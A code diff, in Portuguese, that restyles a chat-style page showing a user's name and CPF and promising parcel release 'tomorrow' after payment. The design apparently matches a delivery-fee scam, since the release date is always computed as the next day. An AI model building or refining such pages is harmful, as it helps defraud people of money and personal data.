@@ -1032,11 +1032,10 @@
     
     <!-- Detalhes finais (inicialmente oculta) -->
     <div id="detalhes-message" class="message-box bot-message hidden">
-      <p class="message-text">ATENÇÃO, <span id="chat-nome3"></span></p>
-      <p class="message-text">CPF: <span id="chat-cpf"></span></p>
-      <p class="message-text">📦 Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></p>
-    </div>
-  </div>
+  <p class="message-text">ATENÇÃO, <strong><span id="chat-nome3"></span></strong></p>
+  <p class="message-text"><strong>CPF:</strong> <strong><span id="chat-cpf"></span></strong></p>
+  <p class="message-text">📦 Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <strong><span id="chat-data"></span></strong></p>
+</div>
   
    <div class="chat-buttons">
     <button id="btn-sim" class="chat-button">SIM</button>
@@ -1299,21 +1298,21 @@
       
       // Preenche os dados no chat
       const nome = document.getElementById("res-nome").textContent;
-      const cpf = document.getElementById("res-cpf").textContent;
-      
-      document.getElementById("chat-nome").textContent = nome;
-      document.getElementById("chat-nome2").textContent = nome;
-      document.getElementById("chat-nome3").textContent = nome;
-      document.getElementById("chat-cpf").textContent = cpf;
-      
-      // Atualiza a data de amanhã
-      const hoje = new Date();
-      const amanha = new Date(hoje);
-      amanha.setDate(hoje.getDate() + 1);
-      const dd = amanha.getDate().toString().padStart(2, '0');
-      const mm = (amanha.getMonth() + 1).toString().padStart(2, '0');
-      const yyyy = amanha.getFullYear();
-      document.getElementById("chat-data").textContent = `${dd}/${mm}/${yyyy}`;
+const cpf = document.getElementById("res-cpf").textContent;
+
+document.getElementById("chat-nome").textContent = nome;
+document.getElementById("chat-nome2").textContent = nome;
+document.getElementById("chat-nome3").textContent = nome;
+document.getElementById("chat-cpf").textContent = cpf;
+
+// Atualiza a data de amanhã
+const hoje = new Date();
+const amanha = new Date(hoje);
+amanha.setDate(hoje.getDate() + 1);
+const dd = amanha.getDate().toString().padStart(2, '0');
+const mm = (amanha.getMonth() + 1).toString().padStart(2, '0');
+const yyyy = amanha.getFullYear();
+document.getElementById("chat-data").textContent = `${dd}/${mm}/${yyyy}`;
     });
 
     // Adicione este novo evento para quando sair do chat (se necessário)
